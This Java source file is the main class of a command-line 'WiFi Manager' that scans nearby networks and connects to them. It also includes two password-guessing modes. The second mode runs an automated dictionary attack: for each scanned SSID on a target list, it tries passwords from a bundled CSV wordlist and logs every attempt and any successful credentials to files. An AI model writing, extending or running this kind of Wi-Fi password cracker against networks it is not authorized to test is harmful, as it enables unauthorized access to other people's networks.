package org.example;

import org.example.io.CsvReader;
import org.example.io.FileLog;
import org.example.matcher.PairMatcher;
import org.example.shell.ShellRunner;
import org.example.shell.SystemShellRunner;
import org.example.wifi.Network;
import org.example.wifi.connect.ShellNetworkConnector;
import org.example.wifi.scan.NetworkScanner;
import org.example.wifi.scan.NetworkScannerFactory;

import java.io.BufferedReader;
import java.io.InputStreamReader;
import java.time.LocalDateTime;
import java.util.List;
import java.util.Scanner;
import java.util.function.Consumer;
import java.util.stream.Stream;

public class Main {

    private static final boolean DEBUG = true;

    public static void main(String[] args) throws Exception {
        Consumer<String> debug = msg -> { if (DEBUG) System.out.println("[DEBUG] " + msg); };

        boolean isMac = System.getProperty("os.name", "").toLowerCase().contains("mac");
        debug.accept("OS: " + System.getProperty("os.name") + " (isMac=" + isMac + ")");

        ShellRunner shell = new SystemShellRunner(debug);
        NetworkScanner scanner = NetworkScannerFactory.forCurrentOs(shell);
        ShellNetworkConnector connector = new ShellNetworkConnector(shell, isMac, debug);

        Scanner input = new Scanner(System.in);
        System.out.println("=== WiFi Manager (" + (isMac ? "macOS" : "Linux") + ") ===");
        System.out.println("1. List available WiFi networks");
        System.out.println("2. Connect to a WiFi network");
        System.out.println("3. Try passwords for a WiFi network");
        System.out.println("4. Try passwords for all WiFi networks");
        System.out.print("Choice: ");
        int choice = input.nextInt();
        input.nextLine();
        debug.accept("User chose: " + choice);

        switch (choice) {
            case 1 -> {
                System.out.println("Scanning...");
                List<Network> networks = scanner.scan();
                System.out.printf("  %-30s %s%n", "SSID", "SIGNAL");
                System.out.println("  " + "-".repeat(40));
                networks.forEach(n -> System.out.printf("  %-30s %s%n", n.ssid(), n.signal()));
            }
            case 2 -> {
                System.out.print("SSID: ");
                String ssid = input.nextLine();
                System.out.print("Password: ");
                String password = input.nextLine();
                System.out.println(connector.connect(ssid, password));
            }
            case 3 -> {
                System.out.print("SSID: ");
                String ssid = input.nextLine();
                System.out.println("Enter passwords to try (enter '0' to stop):");
                while (true) {
                    System.out.print("Password: ");
                    String password = input.nextLine();
                    if ("0".equals(password)) { System.out.println("Stopped."); break; }
                    boolean ok = connector.tryConnect(ssid, password);
                    System.out.println(ok ? "SUCCESS - connected to " + ssid : "ERROR - wrong password or connection failed");
                    if (ok) break;
                }
            }
            case 4 -> {
                List<Network> networks = scanner.scan();
                List<String> allowedNetworks = resourceLines("/networks.txt").toList();
                List<String> targetNetworks = networks.stream()
                    .map(Network::ssid).distinct()
                    .filter(allowedNetworks::contains)
                    .toList();

                int skipPasswords = 17;
                debug.accept("Skipping first " + skipPasswords + " passwords");
                debug.accept("Trying networks: " + targetNetworks);

                var time = LocalDateTime.now();
                try (var traceLog = new FileLog(time, "trace");
                     var successLog = new FileLog(time, "success")) {

                    new PairMatcher<String, String>().match(
                        targetNetworks,
                        CsvReader.column("/passwords_num.csv", 0, s -> s.length() > 7).skip(skipPasswords),
                        (ssid, password) -> {
                            boolean result = connector.tryConnect(ssid, password);
                            traceLog.write("%s: %s @ %s".formatted(result, password, ssid));
                            return result;
                        },
                        match -> {
                            successLog.write("TRUE: %s @ %s".formatted(match.right(), match.left()));
                            System.out.println("Matched " + match);
                        }
                    );
                }
            }
        }
    }

    private static Stream<String> resourceLines(String path) {
        var in = Main.class.getResourceAsStream(path);
        if (in == null) throw new IllegalArgumentException("Resource not found: " + path);
        return new BufferedReader(new InputStreamReader(in)).lines();
    }
}
